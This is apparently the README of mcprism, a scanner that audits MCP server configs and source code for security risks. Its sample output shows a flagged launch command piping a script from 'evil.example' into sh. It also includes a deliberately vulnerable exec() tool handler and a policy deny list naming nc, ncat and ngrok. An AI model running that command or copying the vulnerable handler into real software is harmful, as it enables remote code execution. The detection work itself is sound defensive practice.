<div align="center">

<p>English · <a href="README.zh-CN.md">简体中文</a> · <a href="docs/i18n/README.ja-JP.md">日本語</a> · <a href="docs/i18n/README.ko-KR.md">한국어</a> · <a href="docs/i18n/README.fr-FR.md">Français</a> · <a href="docs/i18n/README.de-DE.md">Deutsch</a> · <a href="docs/i18n/README.es-ES.md">Español</a> · <a href="docs/i18n/README.ru-RU.md">Русский</a> · <a href="docs/i18n/README.ar-SA.md">العربية</a></p>

<img src="assets/logo.svg" width="128" height="128" alt="mcprism logo">

# mcprism

**Check MCP server security risks before connecting it to your AI.**

An MCP server connects your AI to outside tools and data such as GitHub, files,
and databases. Because it may run commands or read files, mcprism reviews its
configuration and local source code and reports potential risks. Run
`mcprism scan` to check servers already configured in your AI client, or
`mcprism doctor` if discovery finds no servers. Use `mcprism vet ...` to review
one before adding it. Optional live inspection lists tools without calling
them; add `--read-content` to scan bounded prompt/resource text too. If you do
not use MCP servers, you probably do not need mcprism yet.

Prefer to review source in your editor? The [VS Code extension](editors/vscode/README.md)
puts findings in the Problems panel while keeping scans static.

mcprism is a security scanner for [Model Context Protocol](https://modelcontextprotocol.io/)
servers. It looks at a server from three angles:

1. **Configuration** — how a client launches or reaches it: pinned packages,
   cleartext transport, credentials in config, cloud metadata and private
   network targets.
2. **Source code** — when the implementation is on disk, it reads the
   JS/TS/Python/Go/Rust/Java/Kotlin/C# tool handlers and traces arguments an agent can control into
   dangerous sinks: process execution, outbound requests (SSRF) and filesystem
   paths, along with eval, unsafe deserialization and hardcoded secrets.
3. **Runtime** — it negotiates the current stateless MCP protocol or the legacy
   handshake, then lists tools, resources and prompts and checks their
   metadata for poisoning. `--read-content` also requests bounded resource and
   prompt text. Neither mode calls tools.

Every server gets a list of findings, a 0–100 score and an A–F grade. mcprism
ships as one Go binary with no runtime dependencies. Local config and source
scans run fully offline and have no side effects. `registry` commands explicitly
contact the [official MCP Registry](https://registry.modelcontextprotocol.io/)
for public metadata but never launch or connect to the listed server. Live
probing is strictly opt-in (`--dynamic` / `--probe`).

[![CI](https://github.com/HUA503/mcprism/actions/workflows/ci.yml/badge.svg)](https://github.com/HUA503/mcprism/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/HUA503/mcprism?color=a6e3a1&label=release)](https://github.com/HUA503/mcprism/releases)
[![Go Report Card](https://goreportcard.com/badge/github.com/HUA503/mcprism)](https://goreportcard.com/report/github.com/HUA503/mcprism)
[![Go version](https://img.shields.io/badge/go-1.25-89b4fa?logo=go&logoColor=white)](https://go.dev)
[![License](https://img.shields.io/github/license/HUA503/mcprism?color=cba6f7)](LICENSE)

</div>

---

<p align="center">
  <img src="assets/demo.gif?v=0.14.0" alt="mcprism checking safe and vulnerable MCP server configurations" width="78%">
</p>

<p align="center">
  <img src="assets/tui.png" alt="mcprism interactive terminal UI" width="86%">
</p>

MCP connects your AI agent to outside servers for tools, files and data. The
protocol is built into Claude Desktop and Claude Code, Cursor, VS Code,
Windsurf and others, so a typical setup reaches several servers before long.
Those servers run commands, read the filesystem and see your prompts. A
malicious or over-privileged server can steal credentials, run commands, or
steer the agent through the text it returns. mcprism gives you a per-server
report and a score before you let an agent use them, the way you would run
`trivy` against an image.

<p align="center">
  <img src="assets/comparison.png" alt="Before and after using mcprism" width="100%">
</p>

## First run in two lines

```sh
curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
mcprism demo
```

```powershell
# Windows PowerShell
irm https://raw.githubusercontent.com/HUA503/mcprism/main/install.ps1 | iex
mcprism demo
```

### Try it without a configured MCP client

The built-in demo is included in the binary, so you do not need a repository
checkout or an MCP client. It scans one clean and several intentionally
vulnerable examples. The scan runs offline, never reads your config, and never
starts a server. Findings are expected and the demo exits successfully.

```sh
mcprism demo
mcprism demo --format html --output mcprism-demo.html
```

On Windows PowerShell, open the report with `Invoke-Item .\mcprism-demo.html`.
To scan your configured MCP clients, run `mcprism scan`.

To try live inspection of prompt/resource bodies, build and scan the bundled
fixture from a source checkout. It returns fixed sample content and never
performs the actions described in its deliberately hostile text:

```sh
mkdir -p bin && go build -o bin/testserver ./examples/testserver
mcprism scan examples/dynamic.mcp.json --dynamic --read-content
```

On Windows PowerShell, use `New-Item -ItemType Directory -Force bin` and
`go build -o bin/testserver.exe ./examples/testserver` before running the scan.

To auto-discover only project configs from your current directory and its
parents, run `mcprism scan --project-only`.

## Vet one server in one line

Check a launch command, URL, package or a checkout on disk without adding it
to any config:

```sh
mcprism vet -- npx -y some-mcp-server
mcprism vet https://mcp.example.com
mcprism vet npm:@scope/name
mcprism vet ./path/to/server     # review a source tree
mcprism vet --repo https://github.com/owner/repo --ref main # public GitHub source
mcprism vet server.py            # review one file
```

`vet` and `scan` are static by default and do not run the target. Add
`--probe` (vet) or `--dynamic` (scan) to launch it and enumerate its tools,
resources and prompts. A source tree or file goes through the SAST engine
below, with no network needed. `--repo` downloads a public GitHub source archive
for static review; it never runs the downloaded code. Omit `--ref` to use the
repository's default branch.

<p align="center">
  <img src="assets/vet.png?v=0.9.2" alt="mcprism vet catching a curl|sh launch command" width="94%">
</p>

## VS Code

Install the `mcprism` CLI and follow the [VS Code extension guide](editors/vscode/README.md)
to install its VSIX. New CLI releases include the matching VSIX on the
[GitHub Releases](https://github.com/HUA503/mcprism/releases) page; older
releases can be packaged from source. Run **mcprism: Scan Workspace** from the
Command Palette to review source findings in Problems. The extension performs
a static scan and does not launch the MCP server.

## Contents

- [Changelog](CHANGELOG.md)
- [Attack surface writeup](docs/MCP-ATTACK-SURFACE.md)
- [Launch kit](docs/LAUNCH-KIT.md)
- [What it does](#what-it-does)
- [When to use it](#when-to-use-it)
- [Report](#report)
- [Install](#install)
- [Quick start](#quick-start)
- [VS Code](#vs-code)
- [Example output](#example-output)
- [Policy as code](#policy-as-code)
- [Source-code review (SAST)](#source-code-review-sast)
- [What it detects](#what-it-detects)
- [Output formats](#output-formats)
- [Supported clients & transports](#supported-clients--transports)
- [CI/CD](#cicd)
- [How it works](#how-it-works)
- [Comparison](#comparison)
- [FAQ](#faq)
- [Roadmap](#roadmap)
- [Contributing](#contributing)

## What it does

- One binary. No Python or Node setup, no LLM API key, no account.
- Static by default. It reads the config and reviews JS/TS/Python/Go/Rust/Kotlin/C# source,
  plus direct callback handlers in the official Java MCP SDK.
  Pass `--dynamic` to negotiate with current or legacy MCP servers and list
  tools, resources and prompts. It never calls a tool.
- Schema-aware. For a live server you have no source for, a string parameter
  named like command, url or path that accepts any value is flagged as command,
  SSRF or path risk. Parameters constrained with enum, const or pattern are
  left alone.
- Tool-poisoning checks. Deterministic offline signatures inspect tool and
  server instructions for common prompt-injection directives in English,
  Simplified and Traditional Chinese, Japanese, Korean, Spanish, French, German,
  Portuguese, Russian and Arabic. They cover high-signal directives such as
  policy overrides, hidden-prompt disclosure and credential exfiltration.
  Matching also checks a view with whitespace and invisible format characters
  removed to catch split phrases. The signatures flag known patterns; they do
  not understand every paraphrase or prove that metadata is safe.
- Policy as code. Turn rules on/off, change severity, allow or deny packages,
  commands and domains, and require network isolation. Built-in profiles give
  you `default`, `strict` and `ci` baselines.
- Accepted-risk register. Suppress findings with a reason and an expiry, or
  accept a whole `--baseline` report so only new problems fail the build.
  Suppressed items stay visible in the report, and expired ones come back.
- Tool inventory locks. Save tool names and SHA-256 fingerprints, then fail if a
  reviewed server adds, removes or changes a tool definition. The lock does not
  contain descriptions or schemas. Saving and verifying connect to the server to
  enumerate tools; they never call a tool.
- Deterministic. 35 built-in rules map to OWASP MCP01–MCP07 where
  applicable. Config and source scans
  never touch the network; registry commands only fetch public metadata from
  the official registry. Live probing is opt-in and starts the server, so run
  it in a sandbox. Probing applies an egress guard (no redirects to cloud
  metadata or link-local addresses) and passes the spawned process a restricted
  environment instead of your full shell.
- Reports for people and machines: table, JSON, Markdown, HTML, SARIF, JUnit
  XML, CycloneDX SBOM and CSV.
- Scan several targets at once: files, directories (recursively), or URLs.

## When to use it

- You installed MCP servers and want to know what they can reach before an
  agent runs them. Run `mcprism scan`.
- A team shares a set of servers and wants one documented baseline. Keep a
  `policy.yml` in version control, and run `--profile strict` on production
  machines.
- You review changes in CI. Run `mcprism scan --profile ci` to fail the build
  on high and above, or publish SARIF to code scanning.
- You want to check a server before adding it to a client. Search the official
  MCP Registry, then scan one entry with `mcprism registry scan <server-name>`
  or audit matching entries together with `mcprism registry audit <query>`. The
  batch audit applies your policy to supported metadata without starting servers.

## Report

<p align="center">
  <img src="assets/screenshot-dynamic.png?v=0.14.0" alt="mcprism HTML report for a live server" width="86%">
</p>

Batch review across many servers (static mode):

<p align="center">
  <img src="assets/screenshot-static.png?v=0.14.0" alt="mcprism HTML report across many servers" width="70%">
</p>

## Install

```sh
# One-line installer (Linux / macOS)
curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh

# Pin a release instead of installing the latest one
curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | MC_PRISM_VERSION=v0.43.3 sh
```

```powershell
# Windows PowerShell
irm https://raw.githubusercontent.com/HUA503/mcprism/main/install.ps1 | iex

# Pin a release instead of installing the latest one
$env:MC_PRISM_VERSION = "v0.43.3"; irm https://raw.githubusercontent.com/HUA503/mcprism/main/install.ps1 | iex
```

```sh
# Go
go install github.com/HUA503/mcprism/cmd/mcprism@latest
```

Homebrew builds mcprism from source and keeps the formula current with each
stable release:

```sh
brew tap HUA503/mcprism https://github.com/HUA503/mcprism
brew install HUA503/mcprism/mcprism
```

The Windows installer verifies the release SHA-256 checksum and adds the
per-user install directory to PATH. You can also download a binary from the
[releases](https://github.com/HUA503/mcprism/releases) page
(Linux/macOS/Windows, amd64 and arm64, plus Linux ARMv7), or install it with
[Scoop](https://scoop.sh):

Both installer scripts accept `MC_PRISM_VERSION` to install a specific release
(with or without the leading `v`); leave it unset or set it to `latest` to use
the latest release. The selected release's checksum is verified before install.

On Linux and macOS, the installer uses `~/.local/bin` when `/usr/local/bin` is
not writable. If it reports that the directory is not on PATH, add that
directory to PATH or run `~/.local/bin/mcprism scan` directly.

```powershell
scoop bucket add mcprism https://github.com/HUA503/mcprism
scoop install mcprism/mcprism
```

With Nix flakes, install the latest package from `main` on Linux or macOS (x86_64 and aarch64):

```sh
nix profile install github:HUA503/mcprism
nix run github:HUA503/mcprism -- scan
```

GoReleaser updates the Scoop manifest during each stable release. Homebrew
builds from the tagged source and updates its formula during the release flow.
The Nix flake builds from the tagged source with a locked nixpkgs input and a
fixed Go dependency hash.

Release archives from v0.8.4 onward include verifiable build provenance. See
[SECURITY.md](SECURITY.md) for the optional verification command.

## Quick start

```sh
# Auto-discover configs for Claude, Codex, Kiro, Amazon Q, GitHub Copilot CLI, Zed, Gemini CLI, OpenCode, ...
mcprism scan

# See which MCP configs auto-discovery can find
mcprism doctor

# A specific config file
mcprism scan ~/.claude.json
mcprism scan ~/.codex/config.toml

# A directory, searched recursively
mcprism scan ./configs

# A remote server
mcprism scan https://mcp.example.com/v1

# Several targets together
mcprism scan a.json b.json ./configs

# Static by default: no process is spawned, no connection is made
mcprism scan mcp.json

# Probe live servers (starts the process; run in a sandbox)
mcprism scan mcp.json --dynamic

# Also request bounded prompt/resource text and scan it for injection
mcprism scan mcp.json --dynamic --read-content

# Enforce a profile or a custom policy
mcprism scan --profile strict
mcprism scan --policy policy.yml --suppressions suppressions.yml

# Accept existing findings and fail only on new ones (incremental rollout)
mcprism scan mcp.json -f json -o baseline.json
mcprism scan mcp.json --baseline baseline.json

# Interactive terminal UI
mcprism scan -i

# Vet a launch command / URL / package without writing a config
mcprism vet -- npx -y some-mcp-server
mcprism vet "uvx some-mcp-server"
mcprism vet https://mcp.example.com
mcprism vet npm:@scope/name
mcprism vet --probe -- npx -y some-mcp-server   # actually run it and list tools
mcprism vet --probe --read-content -- npx -y some-mcp-server

# Search and statically scan one server from the official MCP Registry
mcprism registry search filesystem
mcprism registry scan io.github.user/server-name

# Batch-audit up to 20 matching entries with one combined report
mcprism registry audit filesystem --all --limit 100 --require-complete --format sarif --output registry.sarif

# Reference
mcprism inspect mcp.json     # list a server's tools/resources/prompts
mcprism inspect mcp.json --read-content  # also inspect bounded prompt/resource text
mcprism rules                # list built-in rules
mcprism profiles             # list built-in profiles

# Lock one reviewed server's tool definitions and detect later drift
mcprism inventory save one-server.json --output server.tools.lock.json
mcprism inventory verify one-server.json --baseline server.tools.lock.json
```

By default, Registry batch audit checks one page (up to 100 results). Add `--all`
to follow pagination and audit every matching entry. `--require-complete` also
fails if an entry cannot be audited; review stderr warnings because they may not
appear in the exported report. Add `--require-complete` in CI to exit
with code 2 when more matches exist or a configuration is skipped. The report
is still written when possible; a policy failure retains exit code 1.

### Shell completion

`mcprism completion` generates scripts for Bash, Zsh, Fish and PowerShell. Run the command for your shell:

- Bash or Zsh: `source <(mcprism completion bash)` / `source <(mcprism completion zsh)`
- Fish: `mcprism completion fish | source`
- PowerShell: `mcprism completion powershell | Out-String | Invoke-Expression`

Add the command to your shell profile to enable completion in new sessions.

### Flags

| Flag | Description |
|---|---|
| `-f, --format` | `table` (default) · `json` · `sarif` · `md` · `html` · `junit` · `cyclonedx` · `csv` |
| `-o, --output` | Write the report to a file |
| `-p, --policy` | Path to a policy YAML file |
| `--profile` | Built-in profile: `default` · `strict` · `ci` |
| `--suppressions` | Path to a suppressions YAML file |
| `--fail-on` | Fail the audit on active findings at or above `critical` / `high` / `medium` / `low` |
| `--timeout` | Per-server handshake timeout (default `10s`) |
| `--project-only` (`scan`) | Auto-discover project configs and skip global client configs. Use `--project DIR` to start discovery from another directory. |
| `-i, --interactive` | Browse findings in a TUI |
| `--transport` | Force `http` (Streamable HTTP) or `sse` (legacy) for URLs |
| `--dynamic` (`scan`) | Probe live servers: launch/connect and enumerate tools, resources and prompts. Starts the target process, which may run code or reach the network; run it in a sandbox |
| `--probe` (`vet`) | Launch/connect and enumerate tools; runs the target, prefer a sandbox |
| `--read-content` | With `scan --dynamic`, `vet --probe`, or `inspect`, request text from up to 10 resources and 10 prompts (1 MiB total) and scan it for prompt injection. Required-argument prompts are skipped. This does not call tools; raw content is not included in reports. |
| `--inherit-env` | When spawning a server for probing, pass through the full parent environment. Default is a small safe allowlist, so credentials in your shell are not handed to an untrusted server |
| `--no-color` | Disable ANSI colors in the terminal report |
| `--ascii` | Use ASCII-only glyphs in the terminal (auto-enabled for legacy Windows consoles and `TERM=dumb`; honors `NO_COLOR`) |

`--read-content` is opt-in because `resources/read` and `prompts/get` invoke server
handlers and may expose data the server chooses to return. Use it only with a
trusted target, preferably in a sandbox. The scanner does not save retrieved
text in its report; matched evidence may appear when a rule fires.

For batch `scan` and `vet` runs, use the exit code to distinguish audit results
from command errors.

| Exit code | Meaning |
|---|---|
| `0` | Audit completed and passed the configured gates. |
| `1` | A policy or `--fail-on` gate failed. The report is still written. |
| `2` | The command failed, for example due to an invalid flag, a malformed config file in an explicit directory scan, or a report write error. |

## Example output

Scanning two local servers in static mode:

```text
◆ mcprism   v0.43.3 · 2026-11-28
────────────────────────────────────────────────
 A  notes  ◌ static only
  npx -y @acme/notes-mcp@2.0.1
  capabilities: none
  ✓ No issues detected

 F  shell  ◌ static only
  bash -c curl -s https://evil.example/x | sh
  capabilities: SHELL · NET
  CRIT MCP104  Remote code fetched and executed by shell
  CRIT MCP301  Command execution combined with network access
────────────────────────────────────────────────
2 servers · 2 findings
2 CRIT  0 HIGH  0 MED  0 LOW
```

The HTML and SARIF forms add evidence, advice and the OWASP mapping.

## Policy as code

A policy file is a versioned YAML document. It sets the pass/fail conditions,
overrides individual rules, lists allowed and denied packages/commands/domains,
and can require that servers with file or shell access have no network egress.

```yaml
version: "1"
fail:
  on: high
  grade: B
  score: 70
rules:
  MCP106:
    severity: high
customRules:
  - id: CUSTOM-TEAM-001
    title: Legacy server is blocked
    severity: high
    field: server.target
    pattern: '(?i)legacy-mcp-server'
    description: The team has retired this server.
    advice: Replace it with the approved package.
allow:
  packages: ["@modelcontextprotocol/*"]
deny:
  commands: [nc, ncat]
  domains: ["*.ngrok.io"]
capabilities:
  requireNetworkIsolation: true
```

A deny match is reported as `MCP700`; a file/shell server with network access
under isolation is reported as `MCP701`. See [`examples/policy.yml`](examples/policy.yml),
[`examples/suppressions.yml`](examples/suppressions.yml) and the
[policy guide](docs/POLICIES.md). For compliance gates and machine output, see
[docs/COMPLIANCE.md](docs/COMPLIANCE.md).

`customRules` adds organization-specific regex checks over server settings,
collected metadata and built-in findings. Reports identify the matched field
and location without copying matched text that could contain sensitive data.

## Source-code review (SAST)

Configuration says how a server is launched, not what a handler does with an
argument. A server that looks fine in config can still pass a tool parameter
straight to a shell, use it as a request URL, or open a path built from it.
Those bugs are in the implementation, so mcprism reads the code.

Point `vet` at a checkout or a single file. It needs no build step, no
dependencies installed and no network:

```sh
mcprism vet ./mcp-server
mcprism vet ./mcp-server/src/tool.ts
```

It recognizes the common SDKs and frameworks:

- JavaScript/TypeScript: the `@modelcontextprotocol/sdk` `McpServer`, the
  low-level `Server.setRequestHandler`, and `.tool(...)` registrations.
- Python: the `FastMCP` `@mcp.tool()` decorator and the low-level `call_tool`
  handler.
- Go: mcp-go `server.AddTool` / `mcp.AddTool` inline callbacks and directly
  named handlers with `context.Context` and `mcp.CallToolRequest`.
- Rust: `#[tool]` methods from the official `rmcp` SDK.
- Java: explicit `.callHandler(...)` and `.toolCall(...)` lambda handlers from
  the official Java SDK, plus Spring AI `@McpTool` methods; Java analysis follows
  direct flows and arguments passed to uniquely resolved same-file and
  cross-file helpers when the receiver type is explicit.

For each tool it treats handler arguments as attacker-controlled data. JS/TS,
Python, Go and Rust analysis follows simple local aliases and arguments passed
to unambiguous helpers in the same file. Rust recognizes unique helper function
names, including multi-step call chains. Go sink checks also recognize explicit
aliases for standard-library process, HTTP, network and filesystem packages. Findings
name the file and line, show the code, and say how to fix it:

| Rule | Sink | Default |
|---|---|---|
| MCP801 | Tool input reaches a process/command sink (`exec`, `spawn`, `os.system`, `subprocess shell=True`) | critical |
| MCP802 | Tool input controls an outbound network target (`fetch`, `requests`, `httpx`, `socket`, `net`, `tls`, `TcpStream`) — SSRF | high |
| MCP803 | Tool input used as a filesystem path without confinement | high |
| MCP804 | Dynamic code execution (`eval`, `Function`, `exec`) | high |
| MCP805 | Unsafe deserialization (`pickle`, `marshal`, `yaml.load`) | high |
| MCP806 | Hardcoded credential in the source | high |
| MCP807 | Dynamic module `require`/import whose name comes from tool input | medium |

It recognizes the usual safe patterns and stays quiet when they are present, to
keep false positives down:

- A fixed command with arguments passed as an array (`execFile(cmd, args)`,
  `subprocess.run([...])`) instead of a shell string.
- Path confinement: `path.resolve(base, name)` checked with `startsWith(base)`,
  or `realpath` + `startswith` in Python.
- A constant base URL instead of an agent-chosen host, plus `yaml.safe_load` /
  `SafeLoader`.
- In Go, `exec.Command` with constant args and no shell, a constant URL, and
  `filepath.Join` checked with `strings.HasPrefix`.

This handler is flagged MCP801 because the agent controls the command:

```js
server.tool("run", { command: z.string() }, async ({ command }) => {
  exec(command, (err, stdout) => callback(stdout));
});
```

The fixed version uses an allow-list and never runs a shell:

```js
const ALLOWED = { status: ["git", "status"], log: ["git", "log", "-5"] };
server.tool("git", { name: z.string() }, async ({ name }) => {
  const spec = ALLOWED[name];
  if (!spec) throw new Error("not allowed");
  const [cmd, ...args] = spec;
  return execFile(cmd, args);
});
```

- The engine uses pattern matching and no third-party parser, keeping the binary
  small and self-contained. JS/TS, Python and Go taint tracking follows local
  aliases and arguments passed through unambiguous helper functions. Go also
  follows unique free functions and methods with inferable receiver types
  across files in the same package, plus exported helpers imported from local
  packages in the scanned Go module (up to eight package hops, 64 files and
  16 MiB per entry). JS/TS
  recognizes function declarations and block-bodied arrow helpers. JS/TS
  follows named, namespace and default ES imports (including default-plus-named
  imports), static CommonJS `require()` calls and direct named calls through a
  module object for exported helpers and their helper chains across relative
  modules inside the scan root, within bounded depth, file count and source
  size. Direct `compilerOptions.paths` mappings from the root `tsconfig.json`
  are followed; inherited or nested tsconfig files are not loaded. Single-file
  scans use the file's parent directory as the root.
  Python follows explicitly imported helpers and their helper chains across
  same-directory modules and relative imports within marked parent packages,
  within bounded depth, file count and source size.
  JS/TS, Python and Go also track taint through simple statically named fields;
  Python and Go support literal dictionary/map keys.
  Python/Go local assignments conservatively inherit taint when their expression
  contains a tainted name, without checking a helper's actual return value;
  simple tuple/list unpacking assignments, including Python `*rest` targets and
  Go `var` declarations, are supported, so wrappers that always return a fixed
  safe value may still be over-reported.
  Rust tracking follows local aliases inside recognized `rmcp #[tool]` methods,
  same-file helpers, and explicitly imported, uniquely named free functions in
  the same Cargo package during a source-tree scan.
  Be aware of the known limits; a clean report is not proof of safety:
- Cross-file taint tracking is limited to Go same-package free functions,
  inferable methods, and exported free functions in local module packages;
  explicitly imported Python/JS/TS helpers; and Rust free functions imported
  with simple `crate`, `self` or `super` paths from the same Cargo package.
  Rust helper traversal is bounded and excludes test/example/bench and `src/bin`
  trees. Go follows methods on explicitly known types from local module imports;
  opaque or ambiguous receivers remain unresolved. Python and JS/TS module
  traversal is bounded. The engine does not model arbitrary
  object graphs, returned values, dynamic dispatch, anonymous JS/TS default
  exports, computed module-object calls, or npm package imports. Sink
  matching is pattern-based, so unusual formatting and generated code can still
  be missed or misclassified.
- Go uses the standard-library `go/parser` to locate helper function boundaries
  and recognize inline or directly named mcp-go tool callbacks; it does not
  build a full-program data-flow graph. JS/Python do not use
  tree-sitter.
- Rust analysis recognizes the official `rmcp` `#[tool]` macro and common
  process, `reqwest`, `TcpStream` network, filesystem and secret patterns,
  including direct and grouped `use` aliases for `std::process::Command` and
  `std::fs::File`. It
  follows uniquely named same-file helpers and explicitly imported helpers
  during Cargo directory scans, but does not expand macros or resolve trait
  dispatch.
- JavaScript/TypeScript, Python, Go and Rust receive their documented source
  analysis. Java currently covers explicit SDK callback lambdas, Spring AI
  `@McpTool` methods, same-file helpers and typed direct calls across Java
  files. It does not resolve reflection, interface dispatch or arbitrary bean
  wiring. Other languages get config- and
  metadata-level checks only.

For assurance on a high-risk server, pair mcprism with a full data-flow
analyzer and manual review. Rule details and more examples are in
[docs/SAST.md](docs/SAST.md).

<p align="center">
  <img src="assets/sast.png?v=0.9.2" alt="mcprism source-code review findings" width="94%">
</p>

## What it detects

- Secrets in config. Recognized credential formats (AWS, Google, GitHub, Slack,
  Stripe, GitLab, OpenAI, JWT and more) are flagged by type, and high-entropy
  values that look like generated keys are flagged as suspected secrets.
  Placeholders and `${ENV_VAR}` references are not flagged.
- Cleartext transport and disabled TLS (`http://`,
  `NODE_TLS_REJECT_UNAUTHORIZED=0`).
- Over-broad permissions. Filesystem servers mounted at `/` or the home
  directory; sandbox or permission checks turned off.
- Tool poisoning. High-signal English, Simplified/Traditional Chinese, Japanese,
  Korean, Spanish, French, German, Portuguese, Russian and Arabic
  injection phrases (coverage varies by language), plus zero-width/bidirectional Unicode,
  Unicode Tags and Cyrillic/Greek homoglyphs (normalized with NFKC before
  matching), hidden HTML/Markdown and encoded blobs in tool names, descriptions
  and schemas. Plain instructional text is not flagged; directive language is
  only reported when combined with hidden or confusable characters. The same
  checks cover resource and prompt-template metadata.
- Free-form schema parameters. A live server with no source available is
  checked by parameter name for command, URL (SSRF) and path risk when the
  parameter accepts any string.
- Dangerous capability combinations, such as shell plus network, file read
  plus network, or file write plus shell.
- Network targets. Cloud metadata endpoints (`169.254.169.254`) and
  private/loopback ranges.
- Supply-chain risk: unpinned packages, typosquat look-alikes, and code run
  straight from a remote URL.
- Policy violations: denied packages/commands/domains and broken network isolation.
- Source-code flaws: JS/TS/Python/Go/Java/Kotlin/C# handlers are checked for command, network,
  file, dynamic-code and deserialization risks; Rust `rmcp #[tool]` handlers
  are checked for process, `reqwest` URL, `TcpStream` destination, filesystem
  and hardcoded-secret risks.
  C# directory scans follow uniquely resolved helpers across files when calls
  use a concrete type or a receiver with a known concrete type. Kotlin directory
  scans follow explicitly imported, uniquely resolved top-level helpers and
  extension helpers when their receiver or arguments are tainted.
  See [Source-code review](#source-code-review-sast).
- Cross-server tool name collisions, and classified connectivity failures
  (DNS / TLS / refused / timeout / command not found).

The full list with the OWASP crosswalk is in [docs/RULES.md](docs/RULES.md).

## Output formats

| Format | Typical use |
|---|---|
| `table` | Terminal output |
| `json` | Custom tooling |
| `sarif` | GitHub code scanning |
| `md` | Markdown reports / tickets |
| `html` | Shareable standalone report |
| `junit` | Jenkins, GitLab and GitHub test reports |
| `cyclonedx` | SBOM / vulnerability ingestion |
| `csv` | Spreadsheets and GRC workflows |

## Supported clients & transports

mcprism reads the JSON/JSONC MCP config used by Claude Desktop, Claude Code,
GitHub Copilot CLI, Junie, JetBrains Air, Zed, Cursor, VS Code (GitHub Copilot Chat), Windsurf,
Cline, Roo Code, Continue and similar tools, Kiro's global `~/.kiro/settings/mcp.json`
and project `.kiro/settings/mcp.json`, Amazon Q Developer's global
`~/.aws/amazonq/agents/default.json` and project `.amazonq/default.json`
config (plus the legacy `mcp.json` locations), Gemini CLI's
`~/.gemini/settings.json` and `.gemini/settings.json`, plus Codex's TOML config.
Zed uses `context_servers`
in `~/.config/zed/settings.json` (or `~/.zed/settings.json` on macOS) and
`.zed/settings.json` for projects, including profile-specific server maps.
Copilot CLI user servers come from `~/.copilot/mcp-config.json` (or
`$COPILOT_HOME`); project servers come from `.mcp.json` and `.github/mcp.json`.
OpenCode uses `mcp.servers` in `opencode.json` or
`opencode.jsonc`; local command arrays, environment maps, and remote URLs are
normalized for the same checks. It understands `mcpServers` / `servers` JSON
objects and arrays, and Codex's `[mcp_servers.<name>]` tables. It speaks all
three MCP transports: stdio, Streamable HTTP, and the legacy HTTP+SSE.
Codex discovery checks the system config (`/etc/codex/config.toml` on Unix or
`%ProgramData%/OpenAI/Codex/config.toml` on Windows), the user config
(`$CODEX_HOME/config.toml` or `~/.codex/config.toml`), and project configs
(`.codex/config.toml` and `config.toml`). Values referenced by Codex's
`bearer_token_env_var` are only read when you explicitly enable a live probe
with `--dynamic`.

Gemini CLI discovery also checks system defaults and settings. The paths are
`/etc/gemini-cli/system-defaults.json` and `/etc/gemini-cli/settings.json` on
Linux, `/Library/Application Support/GeminiCli/system-defaults.json` and
`/Library/Application Support/GeminiCli/settings.json` on macOS, and
`%ProgramData%/gemini-cli/system-defaults.json` and
`%ProgramData%/gemini-cli/settings.json` on Windows. Set
`GEMINI_CLI_SYSTEM_DEFAULTS_PATH` or `GEMINI_CLI_SYSTEM_SETTINGS_PATH` to
override either system path.

OpenCode discovery checks user configs in `~/.config/opencode/`, project
configs named `opencode.json(c)` or `.opencode/opencode.json(c)`, and system
configs under `/etc/opencode/` (Linux), `/Library/Application Support/opencode/`
(macOS), or `%ProgramData%/opencode/` (Windows).

Roo Code project discovery checks `.roo/mcp.json`; directory scans also label
this path as a Roo Code config. Global extension settings are discovered from
VS Code-compatible editor storage.

Cline CLI discovery checks `~/.cline/data/settings/cline_mcp_settings.json`.
Set `CLINE_MCP_SETTINGS_PATH` when Cline uses a custom settings path. The
scanner also checks the legacy VS Code extension storage locations.

Amazon Q Developer discovery checks the IDE's global agent config at
`~/.aws/amazonq/agents/default.json` and project config at
`.amazonq/default.json`. It also checks the legacy global and project
`mcp.json` files.

Kiro IDE and CLI share the global `~/.kiro/settings/mcp.json`; the project
config is `.kiro/settings/mcp.json`. Set `KIRO_HOME` to override the global
Kiro directory.

Junie CLI and the JetBrains IDE plugin use `~/.junie/mcp/mcp.json` for user
servers and `.junie/mcp/mcp.json` for project servers. Set `JUNIE_HOME` to
override the user-level directory.

JetBrains Air in IDEs uses `~/.jetbrains/mcp/mcp.json` for user-level servers.
Air project workspaces can share servers from `.air/mcp.json`; directory scans
also identify this file as a JetBrains Air config.

## CI/CD

Run mcprism as a [pre-commit](https://pre-commit.com) hook so changed MCP
configs are checked before they are committed:

```yaml
- repo: https://github.com/HUA503/mcprism
  rev: v0.43.3
  hooks:
    - id: mcprism
```

The hook matches JSON files named like an MCP config (mcp.json, .mcp.json,
claude_desktop_config.json, claude.json). Override `files` in your config for
other names.

Block risky servers in a pipeline with the `ci` profile:

```yaml
- name: Audit MCP servers
  run: |
    curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
    mcprism scan mcp.json --profile ci
```

Publish to GitHub code scanning via SARIF:

```yaml
name: MCP security
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
  security-events: write
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: mcprism
        uses: HUA503/mcprism@v0.43.3
        with:
          target: mcp.json
          source-target: ./server
          sarif-file: mcprism.sarif
          source-sarif-file: mcprism-source.sarif
          # Optional: this dynamically connects to one server; use an isolated runner without secrets.
          # inventory-target: mcp.json
          # inventory-baseline: mcp.tools.lock.json
      - uses: github/codeql-action/upload-sarif@1bd86f2fdb4b86187fa4059f16f31a3202acc9ea # v4
        if: always() && hashFiles('mcprism.sarif') != '' && (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository)
        with:
          sarif_file: mcprism.sarif
          category: mcprism-config
      - uses: github/codeql-action/upload-sarif@1bd86f2fdb4b86187fa4059f16f31a3202acc9ea # v4
        if: always() && hashFiles('mcprism-source.sarif') != '' && (github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository)
        with:
          sarif_file: mcprism-source.sarif
          category: mcprism-source
```

The action downloads the matching Linux, macOS, or Windows release, verifies its
SHA-256 checksum, and runs the `ci` profile by default. `source-target` is
optional; when set, the action also runs the static source review and writes a
second SARIF report. This scan never launches the project. Set `scan-config:
false` to run source review alone. Set `policy`,
